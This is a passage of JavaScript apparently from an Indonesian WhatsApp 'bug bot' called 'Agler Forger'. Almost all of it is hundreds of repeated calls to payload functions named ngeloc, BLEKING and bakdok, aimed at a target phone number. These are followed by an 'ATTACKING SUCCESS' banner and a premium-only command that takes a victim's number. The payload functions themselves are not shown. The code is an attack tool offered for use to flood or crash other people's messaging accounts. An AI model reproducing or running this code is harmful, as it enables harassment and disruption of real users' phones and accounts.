await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
